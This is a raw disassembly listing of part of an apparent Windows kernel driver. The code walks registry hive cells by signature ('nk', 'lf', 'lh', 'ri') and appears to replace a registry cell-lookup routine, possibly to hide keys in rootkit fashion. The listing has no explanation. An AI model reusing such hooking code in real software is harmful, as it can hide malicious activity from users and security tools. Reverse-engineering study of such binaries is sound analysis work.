   140003ba9:	81 fa 5a 29 00 00    	cmp    $0x295a,%edx
   140003baf:	74 08                	je     0x140003bb9
   140003bb1:	81 fa d7 37 00 00    	cmp    $0x37d7,%edx
   140003bb7:	75 23                	jne    0x140003bdc
   140003bb9:	83 f9 0a             	cmp    $0xa,%ecx
   140003bbc:	0f 85 06 ff ff ff    	jne    0x140003ac8
   140003bc2:	85 c0                	test   %eax,%eax
   140003bc4:	0f 85 fe fe ff ff    	jne    0x140003ac8
   140003bca:	c7 03 20 00 00 00    	movl   $0x20,(%rbx)
   140003bd0:	c7 43 04 28 00 00 00 	movl   $0x28,0x4(%rbx)
   140003bd7:	e9 f1 fe ff ff       	jmp    0x140003acd
   140003bdc:	81 fa 39 38 00 00    	cmp    $0x3839,%edx
   140003be2:	0f 85 e0 fe ff ff    	jne    0x140003ac8
   140003be8:	83 f9 0a             	cmp    $0xa,%ecx
   140003beb:	0f 85 d7 fe ff ff    	jne    0x140003ac8
   140003bf1:	85 c0                	test   %eax,%eax
   140003bf3:	0f 85 cf fe ff ff    	jne    0x140003ac8
   140003bf9:	c7 03 18 00 00 00    	movl   $0x18,(%rbx)
   140003bff:	c7 43 04 20 00 00 00 	movl   $0x20,0x4(%rbx)
   140003c06:	e9 c2 fe ff ff       	jmp    0x140003acd
   140003c0b:	cc                   	int3
   140003c0c:	cc                   	int3
   140003c0d:	cc                   	int3
   140003c0e:	cc                   	int3
   140003c0f:	cc                   	int3
   140003c10:	40 53                	rex push %rbx
   140003c12:	48 83 ec 20          	sub    $0x20,%rsp
   140003c16:	8b 52 10             	mov    0x10(%rdx),%edx
   140003c19:	48 8b d9             	mov    %rcx,%rbx
   140003c1c:	ff 15 3e 39 00 00    	call   *0x393e(%rip)        # 0x140007560
   140003c22:	48 85 c0             	test   %rax,%rax
   140003c25:	0f 84 e6 00 00 00    	je     0x140003d11
   140003c2b:	83 78 14 00          	cmpl   $0x0,0x14(%rax)
   140003c2f:	0f 84 dc 00 00 00    	je     0x140003d11
   140003c35:	8b 50 1c             	mov    0x1c(%rax),%edx
   140003c38:	48 8b cb             	mov    %rbx,%rcx
   140003c3b:	ff 15 1f 39 00 00    	call   *0x391f(%rip)        # 0x140007560
   140003c41:	4c 8b d8             	mov    %rax,%r11
   140003c44:	48 85 c0             	test   %rax,%rax
   140003c47:	0f 84 c4 00 00 00    	je     0x140003d11
   140003c4d:	0f b7 40 02          	movzwl 0x2(%rax),%eax
   140003c51:	66 85 c0             	test   %ax,%ax
   140003c54:	0f 84 b7 00 00 00    	je     0x140003d11
   140003c5a:	b9 72 69 00 00       	mov    $0x6972,%ecx
   140003c5f:	66 41 39 0b          	cmp    %cx,(%r11)
   140003c63:	75 29                	jne    0x140003c8e
   140003c65:	0f b7 c8             	movzwl %ax,%ecx
   140003c68:	41 8b 14 8b          	mov    (%r11,%rcx,4),%edx
   140003c6c:	48 8b cb             	mov    %rbx,%rcx
   140003c6f:	ff 15 eb 38 00 00    	call   *0x38eb(%rip)        # 0x140007560
   140003c75:	4c 8b d8             	mov    %rax,%r11
   140003c78:	48 85 c0             	test   %rax,%rax
   140003c7b:	0f 84 90 00 00 00    	je     0x140003d11
   140003c81:	66 8b 40 02          	mov    0x2(%rax),%ax
   140003c85:	66 85 c0             	test   %ax,%ax
   140003c88:	0f 84 83 00 00 00    	je     0x140003d11
   140003c8e:	41 0f b7 0b          	movzwl (%r11),%ecx
   140003c92:	ba 6c 66 00 00       	mov    $0x666c,%edx
   140003c97:	66 3b ca             	cmp    %dx,%cx
   140003c9a:	74 13                	je     0x140003caf
   140003c9c:	ba 6c 68 00 00       	mov    $0x686c,%edx
   140003ca1:	66 3b ca             	cmp    %dx,%cx
   140003ca4:	74 09                	je     0x140003caf
   140003ca6:	0f b7 c0             	movzwl %ax,%eax
   140003ca9:	41 8b 14 83          	mov    (%r11,%rax,4),%edx
   140003cad:	eb 08                	jmp    0x140003cb7
   140003caf:	0f b7 c0             	movzwl %ax,%eax
   140003cb2:	41 8b 54 c3 fc       	mov    -0x4(%r11,%rax,8),%edx
   140003cb7:	48 8b cb             	mov    %rbx,%rcx
   140003cba:	ff 15 a0 38 00 00    	call   *0x38a0(%rip)        # 0x140007560
   140003cc0:	48 8b d8             	mov    %rax,%rbx
   140003cc3:	48 85 c0             	test   %rax,%rax
   140003cc6:	74 40                	je     0x140003d08
   140003cc8:	b8 6e 6b 00 00       	mov    $0x6b6e,%eax
   140003ccd:	66 39 03             	cmp    %ax,(%rbx)
   140003cd0:	75 36                	jne    0x140003d08
   140003cd2:	f6 43 0c 02          	testb  $0x2,0xc(%rbx)
   140003cd6:	75 30                	jne    0x140003d08
   140003cd8:	48 8b cb             	mov    %rbx,%rcx
   140003cdb:	ff 15 87 14 00 00    	call   *0x1487(%rip)        # 0x140005168
   140003ce1:	45 33 c0             	xor    %r8d,%r8d
   140003ce4:	41 8d 50 24          	lea    0x24(%r8),%edx
   140003ce8:	48 8b c8             	mov    %rax,%rcx
   140003ceb:	ff 15 7f 14 00 00    	call   *0x147f(%rip)        # 0x140005170
   140003cf1:	48 85 c0             	test   %rax,%rax
   140003cf4:	74 1b                	je     0x140003d11
   140003cf6:	83 48 0c 02          	orl    $0x2,0xc(%rax)
   140003cfa:	ba 24 00 00 00       	mov    $0x24,%edx
   140003cff:	48 8b c8             	mov    %rax,%rcx
   140003d02:	ff 15 70 14 00 00    	call   *0x1470(%rip)        # 0x140005178
   140003d08:	48 8b c3             	mov    %rbx,%rax
   140003d0b:	48 83 c4 20          	add    $0x20,%rsp
   140003d0f:	5b                   	pop    %rbx
   140003d10:	c3                   	ret
   140003d11:	33 c0                	xor    %eax,%eax
   140003d13:	48 83 c4 20          	add    $0x20,%rsp
   140003d17:	5b                   	pop    %rbx
   140003d18:	c3                   	ret
   140003d19:	cc                   	int3
   140003d1a:	cc                   	int3
   140003d1b:	cc                   	int3
   140003d1c:	cc                   	int3
   140003d1d:	cc                   	int3
   140003d1e:	cc                   	int3
   140003d1f:	cc                   	int3
   140003d20:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003d25:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140003d2a:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   140003d2f:	41 54                	push   %r12
   140003d31:	48 83 ec 30          	sub    $0x30,%rsp
   140003d35:	48 8b f9             	mov    %rcx,%rdi
   140003d38:	ff 15 22 38 00 00    	call   *0x3822(%rip)        # 0x140007560
   140003d3e:	48 85 c0             	test   %rax,%rax
   140003d41:	74 7e                	je     0x140003dc1
   140003d43:	80 3d ba 22 00 00 00 	cmpb   $0x0,0x22ba(%rip)        # 0x140006004
   140003d4a:	74 75                	je     0x140003dc1
   140003d4c:	33 f6                	xor    %esi,%esi
   140003d4e:	8b ce                	mov    %esi,%ecx
   140003d50:	89 4c 24 20          	mov    %ecx,0x20(%rsp)
   140003d54:	4c 8d 25 a5 c2 ff ff 	lea    -0x3d5b(%rip),%r12        # 0x140000000
   140003d5b:	44 8b 05 12 38 00 00 	mov    0x3812(%rip),%r8d        # 0x140007574
   140003d62:	41 3b c8             	cmp    %r8d,%ecx
   140003d65:	73 56                	jae    0x140003dbd
   140003d67:	48 63 d9             	movslq %ecx,%rbx
   140003d6a:	49 8b 94 dc d0 89 00 	mov    0x89d0(%r12,%rbx,8),%rdx
   140003d71:	00 
   140003d72:	48 3b c2             	cmp    %rdx,%rax
   140003d75:	75 27                	jne    0x140003d9e
   140003d77:	48 8b cf             	mov    %rdi,%rcx
   140003d7a:	e8 91 fe ff ff       	call   0x140003c10
   140003d7f:	49 89 84 dc 20 8a 00 	mov    %rax,0x8a20(%r12,%rbx,8)
   140003d86:	00 
   140003d87:	49 3b 84 dc d0 89 00 	cmp    0x89d0(%r12,%rbx,8),%rax
   140003d8e:	00 
   140003d8f:	75 2c                	jne    0x140003dbd
   140003d91:	49 89 b4 dc 20 8a 00 	mov    %rsi,0x8a20(%r12,%rbx,8)
   140003d98:	00 
   140003d99:	48 8b c6             	mov    %rsi,%rax
   140003d9c:	eb 1f                	jmp    0x140003dbd
   140003d9e:	49 3b 84 dc 20 8a 00 	cmp    0x8a20(%r12,%rbx,8),%rax
   140003da5:	00 
   140003da6:	75 0d                	jne    0x140003db5
   140003da8:	49 89 b4 dc 20 8a 00 	mov    %rsi,0x8a20(%r12,%rbx,8)
   140003daf:	00 
   140003db0:	48 8b c6             	mov    %rsi,%rax
   140003db3:	eb 08                	jmp    0x140003dbd
   140003db5:	ff c1                	inc    %ecx
   140003db7:	89 4c 24 20          	mov    %ecx,0x20(%rsp)
   140003dbb:	eb a5                	jmp    0x140003d62
   140003dbd:	eb 02                	jmp    0x140003dc1
   140003dbf:	33 c0                	xor    %eax,%eax
   140003dc1:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140003dc6:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   140003dcb:	48 8b 7c 24 50       	mov    0x50(%rsp),%rdi
   140003dd0:	48 83 c4 30          	add    $0x30,%rsp
   140003dd4:	41 5c                	pop    %r12
   140003dd6:	c3                   	ret
   140003dd7:	cc                   	int3
   140003dd8:	cc                   	int3
   140003dd9:	cc                   	int3
   140003dda:	cc                   	int3
   140003ddb:	cc                   	int3
   140003ddc:	cc                   	int3
   140003ddd:	cc                   	int3
   140003dde:	cc                   	int3
   140003ddf:	cc                   	int3
   140003de0:	40 53                	rex push %rbx
   140003de2:	48 83 ec 20          	sub    $0x20,%rsp
   140003de6:	8b 52 10             	mov    0x10(%rdx),%edx
   140003de9:	33 c0                	xor    %eax,%eax
   140003deb:	4c 8d 44 24 38       	lea    0x38(%rsp),%r8
   140003df0:	48 8b d9             	mov    %rcx,%rbx
   140003df3:	89 44 24 38          	mov    %eax,0x38(%rsp)
   140003df7:	ff 15 63 37 00 00    	call   *0x3763(%rip)        # 0x140007560
   140003dfd:	48 85 c0             	test   %rax,%rax
   140003e00:	0f 84 f5 00 00 00    	je     0x140003efb
   140003e06:	83 78 14 00          	cmpl   $0x0,0x14(%rax)
   140003e0a:	0f 84 eb 00 00 00    	je     0x140003efb
   140003e10:	8b 50 1c             	mov    0x1c(%rax),%edx
   140003e13:	4c 8d 44 24 38       	lea    0x38(%rsp),%r8
   140003e18:	48 8b cb             	mov    %rbx,%rcx
   140003e1b:	ff 15 3f 37 00 00    	call   *0x373f(%rip)        # 0x140007560
   140003e21:	4c 8b d8             	mov    %rax,%r11
   140003e24:	48 85 c0             	test   %rax,%rax
   140003e27:	0f 84 ce 00 00 00    	je     0x140003efb
   140003e2d:	0f b7 40 02          	movzwl 0x2(%rax),%eax
   140003e31:	66 85 c0             	test   %ax,%ax
   140003e34:	0f 84 c1 00 00 00    	je     0x140003efb
   140003e3a:	b9 72 69 00 00       	mov    $0x6972,%ecx
   140003e3f:	66 41 39 0b          	cmp    %cx,(%r11)
   140003e43:	75 2e                	jne    0x140003e73
   140003e45:	0f b7 c8             	movzwl %ax,%ecx
   140003e48:	4c 8d 44 24 38       	lea    0x38(%rsp),%r8
   140003e4d:	41 8b 14 8b          	mov    (%r11,%rcx,4),%edx
   140003e51:	48 8b cb             	mov    %rbx,%rcx
   140003e54:	ff 15 06 37 00 00    	call   *0x3706(%rip)        # 0x140007560
   140003e5a:	4c 8b d8             	mov    %rax,%r11
   140003e5d:	48 85 c0             	test   %rax,%rax
   140003e60:	0f 84 95 00 00 00    	je     0x140003efb
   140003e66:	66 8b 40 02          	mov    0x2(%rax),%ax
   140003e6a:	66 85 c0             	test   %ax,%ax
   140003e6d:	0f 84 88 00 00 00    	je     0x140003efb
   140003e73:	41 0f b7 0b          	movzwl (%r11),%ecx
   140003e77:	ba 6c 66 00 00       	mov    $0x666c,%edx
   140003e7c:	66 3b ca             	cmp    %dx,%cx
   140003e7f:	74 13                	je     0x140003e94
   140003e81:	ba 6c 68 00 00       	mov    $0x686c,%edx
   140003e86:	66 3b ca             	cmp    %dx,%cx
   140003e89:	74 09                	je     0x140003e94
   140003e8b:	0f b7 c0             	movzwl %ax,%eax
   140003e8e:	41 8b 14 83          	mov    (%r11,%rax,4),%edx
   140003e92:	eb 08                	jmp    0x140003e9c
   140003e94:	0f b7 c0             	movzwl %ax,%eax
   140003e97:	41 8b 54 c3 fc       	mov    -0x4(%r11,%rax,8),%edx
   140003e9c:	4c 8d 44 24 38       	lea    0x38(%rsp),%r8
   140003ea1:	48 8b cb             	mov    %rbx,%rcx
   140003ea4:	ff 15 b6 36 00 00    	call   *0x36b6(%rip)        # 0x140007560
   140003eaa:	48 8b d8             	mov    %rax,%rbx
   140003ead:	48 85 c0             	test   %rax,%rax
   140003eb0:	74 40                	je     0x140003ef2
   140003eb2:	b8 6e 6b 00 00       	mov    $0x6b6e,%eax
   140003eb7:	66 39 03             	cmp    %ax,(%rbx)
   140003eba:	75 36                	jne    0x140003ef2
   140003ebc:	f6 43 0c 02          	testb  $0x2,0xc(%rbx)
   140003ec0:	75 30                	jne    0x140003ef2
   140003ec2:	48 8b cb             	mov    %rbx,%rcx
   140003ec5:	ff 15 9d 12 00 00    	call   *0x129d(%rip)        # 0x140005168
   140003ecb:	45 33 c0             	xor    %r8d,%r8d
   140003ece:	41 8d 50 24          	lea    0x24(%r8),%edx
   140003ed2:	48 8b c8             	mov    %rax,%rcx
   140003ed5:	ff 15 95 12 00 00    	call   *0x1295(%rip)        # 0x140005170
   140003edb:	48 85 c0             	test   %rax,%rax
   140003ede:	74 1b                	je     0x140003efb
   140003ee0:	83 48 0c 02          	orl    $0x2,0xc(%rax)
   140003ee4:	ba 24 00 00 00       	mov    $0x24,%edx
   140003ee9:	48 8b c8             	mov    %rax,%rcx
   140003eec:	ff 15 86 12 00 00    	call   *0x1286(%rip)        # 0x140005178
   140003ef2:	48 8b c3             	mov    %rbx,%rax
   140003ef5:	48 83 c4 20          	add    $0x20,%rsp
   140003ef9:	5b                   	pop    %rbx
   140003efa:	c3                   	ret
   140003efb:	33 c0                	xor    %eax,%eax
   140003efd:	48 83 c4 20          	add    $0x20,%rsp
   140003f01:	5b                   	pop    %rbx
   140003f02:	c3                   	ret
   140003f03:	cc                   	int3
   140003f04:	cc                   	int3
   140003f05:	cc                   	int3
   140003f06:	cc                   	int3
   140003f07:	cc                   	int3
   140003f08:	cc                   	int3
   140003f09:	cc                   	int3
   140003f0a:	cc                   	int3
   140003f0b:	cc                   	int3
   140003f0c:	cc                   	int3
   140003f0d:	cc                   	int3
   140003f0e:	cc                   	int3
   140003f0f:	cc                   	int3
   140003f10:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003f15:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140003f1a:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   140003f1f:	41 54                	push   %r12
   140003f21:	48 83 ec 30          	sub    $0x30,%rsp
   140003f25:	48 8b f9             	mov    %rcx,%rdi
   140003f28:	ff 15 32 36 00 00    	call   *0x3632(%rip)        # 0x140007560
   140003f2e:	48 85 c0             	test   %rax,%rax
   140003f31:	74 7e                	je     0x140003fb1
   140003f33:	80 3d ca 20 00 00 00 	cmpb   $0x0,0x20ca(%rip)        # 0x140006004
   140003f3a:	74 75                	je     0x140003fb1
   140003f3c:	33 f6                	xor    %esi,%esi
   140003f3e:	8b ce                	mov    %esi,%ecx
   140003f40:	89 4c 24 20          	mov    %ecx,0x20(%rsp)
   140003f44:	4c 8d 25 b5 c0 ff ff 	lea    -0x3f4b(%rip),%r12        # 0x140000000
   140003f4b:	44 8b 05 22 36 00 00 	mov    0x3622(%rip),%r8d        # 0x140007574
   140003f52:	41 3b c8             	cmp    %r8d,%ecx
   140003f55:	73 56                	jae    0x140003fad
   140003f57:	48 63 d9             	movslq %ecx,%rbx
   140003f5a:	49 8b 94 dc d0 89 00 	mov    0x89d0(%r12,%rbx,8),%rdx
   140003f61:	00 
   140003f62:	48 3b c2             	cmp    %rdx,%rax
   140003f65:	75 27                	jne    0x140003f8e
   140003f67:	48 8b cf             	mov    %rdi,%rcx
   140003f6a:	e8 71 fe ff ff       	call   0x140003de0
   140003f6f:	49 89 84 dc 20 8a 00 	mov    %rax,0x8a20(%r12,%rbx,8)
   140003f76:	00 
   140003f77:	49 3b 84 dc d0 89 00 	cmp    0x89d0(%r12,%rbx,8),%rax
   140003f7e:	00 
   140003f7f:	75 2c                	jne    0x140003fad
   140003f81:	49 89 b4 dc 20 8a 00 	mov    %rsi,0x8a20(%r12,%rbx,8)
   140003f88:	00 
   140003f89:	48 8b c6             	mov    %rsi,%rax
   140003f8c:	eb 1f                	jmp    0x140003fad
   140003f8e:	49 3b 84 dc 20 8a 00 	cmp    0x8a20(%r12,%rbx,8),%rax
   140003f95:	00 
   140003f96:	75 0d                	jne    0x140003fa5
   140003f98:	49 89 b4 dc 20 8a 00 	mov    %rsi,0x8a20(%r12,%rbx,8)
   140003f9f:	00 
   140003fa0:	48 8b c6             	mov    %rsi,%rax
   140003fa3:	eb 08                	jmp    0x140003fad
   140003fa5:	ff c1                	inc    %ecx
   140003fa7:	89 4c 24 20          	mov    %ecx,0x20(%rsp)
   140003fab:	eb a5                	jmp    0x140003f52
   140003fad:	eb 02                	jmp    0x140003fb1
   140003faf:	33 c0                	xor    %eax,%eax
   140003fb1:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140003fb6:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   140003fbb:	48 8b 7c 24 50       	mov    0x50(%rsp),%rdi
   140003fc0:	48 83 c4 30          	add    $0x30,%rsp
   140003fc4:	41 5c                	pop    %r12
   140003fc6:	c3                   	ret
   140003fc7:	cc                   	int3
   140003fc8:	cc                   	int3
   140003fc9:	cc                   	int3
   140003fca:	cc                   	int3
   140003fcb:	cc                   	int3
   140003fcc:	cc                   	int3
   140003fcd:	cc                   	int3
   140003fce:	cc                   	int3
   140003fcf:	cc                   	int3
   140003fd0:	40 57                	rex push %rdi
   140003fd2:	48 81 ec 00 0a 00 00 	sub    $0xa00,%rsp
   140003fd9:	48 8d 8c 24 80 00 00 	lea    0x80(%rsp),%rcx
   140003fe0:	00 
   140003fe1:	48 8d 15 28 17 00 00 	lea    0x1728(%rip),%rdx        # 0x140005710
   140003fe8:	41 b8 6a 00 00 00    	mov    $0x6a,%r8d
   140003fee:	40 32 ff             	xor    %dil,%dil
   140003ff1:	e8 ea 0a 00 00       	call   0x140004ae0
   140003ff6:	48 8d 94 24 80 00 00 	lea    0x80(%rsp),%rdx
   140003ffd:	00 
   140003ffe:	33 c9                	xor    %ecx,%ecx
   140004000:	ff 15 7a 11 00 00    	call   *0x117a(%rip)        # 0x140005180
   140004006:	85 c0                	test   %eax,%eax
   140004008:	0f 88 da 01 00 00    	js     0x1400041e8
   14000400e:	48 89 9c 24 20 0a 00 	mov    %rbx,0xa20(%rsp)
   140004015:	00 
   140004016:	48 89 ac 24 f8 09 00 	mov    %rbp,0x9f8(%rsp)
   14000401d:	00 
   14000401e:	48 89 b4 24 f0 09 00 	mov    %rsi,0x9f0(%rsp)
   140004025:	00 
   140004026:	33 f6                	xor    %esi,%esi
   140004028:	48 8d 2d 51 35 00 00 	lea    0x3551(%rip),%rbp        # 0x140007580
   14000402f:	8b de                	mov    %esi,%ebx
   140004031:	66 66 66 66 66 66 66 	data16 data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   140004038:	0f 1f 84 00 00 00 00 
   14000403f:	00 
   140004040:	48 8d 8c 24 f0 00 00 	lea    0xf0(%rsp),%rcx
   140004047:	00 
   140004048:	33 d2                	xor    %edx,%edx
   14000404a:	41 b8 00 01 00 00    	mov    $0x100,%r8d
   140004050:	48 89 b4 24 18 0a 00 	mov    %rsi,0xa18(%rsp)
   140004057:	00 
   140004058:	e8 d3 0d 00 00       	call   0x140004e30
   14000405d:	48 8d 8c 24 f0 01 00 	lea    0x1f0(%rsp),%rcx
   140004064:	00 
   140004065:	33 d2                	xor    %edx,%edx
   140004067:	41 b8 00 08 00 00    	mov    $0x800,%r8d
   14000406d:	e8 be 0d 00 00       	call   0x140004e30
   140004072:	48 8d 94 24 80 00 00 	lea    0x80(%rsp),%rdx
   140004079:	00 
   14000407a:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   14000407f:	ff 15 7b 0f 00 00    	call   *0xf7b(%rip)        # 0x140005000
   140004085:	48 8d 44 24 70       	lea    0x70(%rsp),%rax
   14000408a:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   14000408f:	48 8d 8c 24 18 0a 00 	lea    0xa18(%rsp),%rcx
   140004096:	00 
   140004097:	ba 01 00 00 00       	mov    $0x1,%edx
   14000409c:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   1400040a1:	c7 44 24 30 30 00 00 	movl   $0x30,0x30(%rsp)
   1400040a8:	00 
   1400040a9:	48 89 74 24 38       	mov    %rsi,0x38(%rsp)
   1400040ae:	c7 44 24 48 40 00 00 	movl   $0x40,0x48(%rsp)
   1400040b5:	00 
   1400040b6:	48 89 74 24 50       	mov    %rsi,0x50(%rsp)
   1400040bb:	48 89 74 24 58       	mov    %rsi,0x58(%rsp)
   1400040c0:	ff 15 5a 10 00 00    	call   *0x105a(%rip)        # 0x140005120
   1400040c6:	85 c0                	test   %eax,%eax
   1400040c8:	0f 88 f7 00 00 00    	js     0x1400041c5
   1400040ce:	ff c3                	inc    %ebx
   1400040d0:	4c 8d 05 a5 16 00 00 	lea    0x16a5(%rip),%r8        # 0x14000577c
   1400040d7:	48 8d 8c 24 f0 00 00 	lea    0xf0(%rsp),%rcx
   1400040de:	00 
   1400040df:	44 8b cb             	mov    %ebx,%r9d
   1400040e2:	ba 00 01 00 00       	mov    $0x100,%edx
   1400040e7:	e8 74 f8 ff ff       	call   0x140003960
   1400040ec:	48 8d 94 24 f0 00 00 	lea    0xf0(%rsp),%rdx
   1400040f3:	00 
   1400040f4:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   1400040f9:	ff 15 01 0f 00 00    	call   *0xf01(%rip)        # 0x140005000
   1400040ff:	48 8b 8c 24 18 0a 00 	mov    0xa18(%rsp),%rcx
   140004106:	00 
   140004107:	4c 8d 9c 24 10 0a 00 	lea    0xa10(%rsp),%r11
   14000410e:	00 
   14000410f:	4c 89 5c 24 28       	mov    %r11,0x28(%rsp)
   140004114:	4c 8d 8c 24 f0 01 00 	lea    0x1f0(%rsp),%r9
   14000411b:	00 
   14000411c:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   140004121:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140004127:	c7 44 24 20 00 10 00 	movl   $0x1000,0x20(%rsp)
   14000412e:	00 
   14000412f:	ff 15 f3 0f 00 00    	call   *0xff3(%rip)        # 0x140005128
   140004135:	85 c0                	test   %eax,%eax
   140004137:	78 7e                	js     0x1400041b7
   140004139:	48 8b 8c 24 18 0a 00 	mov    0xa18(%rsp),%rcx
   140004140:	00 
   140004141:	ff 15 91 0f 00 00    	call   *0xf91(%rip)        # 0x1400050d8
   140004147:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
   14000414b:	33 c0                	xor    %eax,%eax
   14000414d:	48 8d bc 24 fc 01 00 	lea    0x1fc(%rsp),%rdi
   140004154:	00 
   140004155:	66 f2 af             	repnz scas (%rdi),%ax
   140004158:	48 f7 d1             	not    %rcx
   14000415b:	48 ff c9             	dec    %rcx
   14000415e:	48 81 f9 08 02 00 00 	cmp    $0x208,%rcx
   140004165:	73 42                	jae    0x1400041a9
   140004167:	8b 3d 03 34 00 00    	mov    0x3403(%rip),%edi        # 0x140007570
   14000416d:	48 8d 94 24 fc 01 00 	lea    0x1fc(%rsp),%rdx
   140004174:	00 
   140004175:	48 8d 8c 24 fc 01 00 	lea    0x1fc(%rsp),%rcx
   14000417c:	00 
   14000417d:	48 8b c7             	mov    %rdi,%rax
   140004180:	48 69 c0 08 02 00 00 	imul   $0x208,%rax,%rax
   140004187:	48 2b c2             	sub    %rdx,%rax
   14000418a:	48 8d 14 28          	lea    (%rax,%rbp,1),%rdx
   14000418e:	66 90                	xchg   %ax,%ax
   140004190:	0f b7 01             	movzwl (%rcx),%eax
   140004193:	48 83 c1 02          	add    $0x2,%rcx
   140004197:	66 89 44 0a fe       	mov    %ax,-0x2(%rdx,%rcx,1)
   14000419c:	66 85 c0             	test   %ax,%ax
   14000419f:	75 ef                	jne    0x140004190
   1400041a1:	ff c7                	inc    %edi
   1400041a3:	89 3d c7 33 00 00    	mov    %edi,0x33c7(%rip)        # 0x140007570
   1400041a9:	83 fb 0a             	cmp    $0xa,%ebx
   1400041ac:	40 b7 01             	mov    $0x1,%dil
   1400041af:	0f 8c 8b fe ff ff    	jl     0x140004040
   1400041b5:	eb 0e                	jmp    0x1400041c5
   1400041b7:	48 8b 8c 24 18 0a 00 	mov    0xa18(%rsp),%rcx
   1400041be:	00 
   1400041bf:	ff 15 13 0f 00 00    	call   *0xf13(%rip)        # 0x1400050d8
   1400041c5:	48 8b ac 24 f8 09 00 	mov    0x9f8(%rsp),%rbp
   1400041cc:	00 
   1400041cd:	48 8b 9c 24 20 0a 00 	mov    0xa20(%rsp),%rbx
   1400041d4:	00 
   1400041d5:	b8 01 00 00 c0       	mov    $0xc0000001,%eax
   1400041da:	40 84 ff             	test   %dil,%dil
   1400041dd:	0f 45 c6             	cmovne %esi,%eax
   1400041e0:	48 8b b4 24 f0 09 00 	mov    0x9f0(%rsp),%rsi
   1400041e7:	00 
   1400041e8:	48 81 c4 00 0a 00 00 	add    $0xa00,%rsp
   1400041ef:	5f                   	pop    %rdi
   1400041f0:	c3                   	ret
   1400041f1:	cc                   	int3
   1400041f2:	cc                   	int3
   1400041f3:	cc                   	int3
   1400041f4:	cc                   	int3
   1400041f5:	cc                   	int3
   1400041f6:	cc                   	int3
   1400041f7:	cc                   	int3
   1400041f8:	cc                   	int3
   1400041f9:	cc                   	int3
   1400041fa:	cc                   	int3
   1400041fb:	cc                   	int3
   1400041fc:	cc                   	int3
   1400041fd:	cc                   	int3
   1400041fe:	cc                   	int3
   1400041ff:	cc                   	int3
   140004200:	48 81 ec c8 08 00 00 	sub    $0x8c8,%rsp
   140004207:	e8 c4 fd ff ff       	call   0x140003fd0
   14000420c:	85 c0                	test   %eax,%eax
   14000420e:	0f 88 a6 03 00 00    	js     0x1400045ba
   140004214:	33 c0                	xor    %eax,%eax
   140004216:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   14000421b:	89 44 24 30          	mov    %eax,0x30(%rsp)
   14000421f:	89 44 24 34          	mov    %eax,0x34(%rsp)
   140004223:	89 44 24 38          	mov    %eax,0x38(%rsp)
   140004227:	89 44 24 3c          	mov    %eax,0x3c(%rsp)
   14000422b:	89 44 24 40          	mov    %eax,0x40(%rsp)
   14000422f:	e8 ac f7 ff ff       	call   0x1400039e0
   140004234:	85 c0                	test   %eax,%eax
   140004236:	0f 88 7e 03 00 00    	js     0x1400045ba
   14000423c:	48 89 b4 24 b8 08 00 	mov    %rsi,0x8b8(%rsp)
   140004243:	00 
   140004244:	4c 89 b4 24 98 08 00 	mov    %r14,0x898(%rsp)
   14000424b:	00 
   14000424c:	45 33 f6             	xor    %r14d,%r14d
   14000424f:	41 8b f6             	mov    %r14d,%esi
   140004252:	44 39 35 17 33 00 00 	cmp    %r14d,0x3317(%rip)        # 0x140007570
   140004259:	0f 86 0f 02 00 00    	jbe    0x14000446e
   14000425f:	48 89 ac 24 c0 08 00 	mov    %rbp,0x8c0(%rsp)
   140004266:	00 
   140004267:	8b 6c 24 38          	mov    0x38(%rsp),%ebp
   14000426b:	4c 89 a4 24 a8 08 00 	mov    %r12,0x8a8(%rsp)
   140004272:	00 
   140004273:	44 8b 64 24 30       	mov    0x30(%rsp),%r12d
   140004278:	4c 89 ac 24 a0 08 00 	mov    %r13,0x8a0(%rsp)
   14000427f:	00 
   140004280:	44 8b 6c 24 34       	mov    0x34(%rsp),%r13d
   140004285:	4c 89 bc 24 90 08 00 	mov    %r15,0x890(%rsp)
   14000428c:	00 
   14000428d:	48 89 9c 24 d0 08 00 	mov    %rbx,0x8d0(%rsp)
   140004294:	00 
   140004295:	48 8d 0d e4 32 00 00 	lea    0x32e4(%rip),%rcx        # 0x140007580
   14000429c:	48 89 bc 24 b0 08 00 	mov    %rdi,0x8b0(%rsp)
   1400042a3:	00 
   1400042a4:	4c 8d 3d 75 fa ff ff 	lea    -0x58b(%rip),%r15        # 0x140003d20
   1400042ab:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400042b0:	48 63 d6             	movslq %esi,%rdx
   1400042b3:	4c 89 b4 24 e0 08 00 	mov    %r14,0x8e0(%rsp)
   1400042ba:	00 
   1400042bb:	48 69 d2 08 02 00 00 	imul   $0x208,%rdx,%rdx
   1400042c2:	48 03 d1             	add    %rcx,%rdx
   1400042c5:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   1400042ca:	ff 15 30 0d 00 00    	call   *0xd30(%rip)        # 0x140005000
   1400042d0:	48 8d 44 24 48       	lea    0x48(%rsp),%rax
   1400042d5:	4c 8d 44 24 58       	lea    0x58(%rsp),%r8
   1400042da:	48 8d 8c 24 e0 08 00 	lea    0x8e0(%rsp),%rcx
   1400042e1:	00 
   1400042e2:	ba 19 00 02 00       	mov    $0x20019,%edx
   1400042e7:	48 89 44 24 68       	mov    %rax,0x68(%rsp)
   1400042ec:	c7 44 24 58 30 00 00 	movl   $0x30,0x58(%rsp)
   1400042f3:	00 
   1400042f4:	4c 89 74 24 60       	mov    %r14,0x60(%rsp)
   1400042f9:	c7 44 24 70 40 02 00 	movl   $0x240,0x70(%rsp)
   140004300:	00 
   140004301:	4c 89 74 24 78       	mov    %r14,0x78(%rsp)
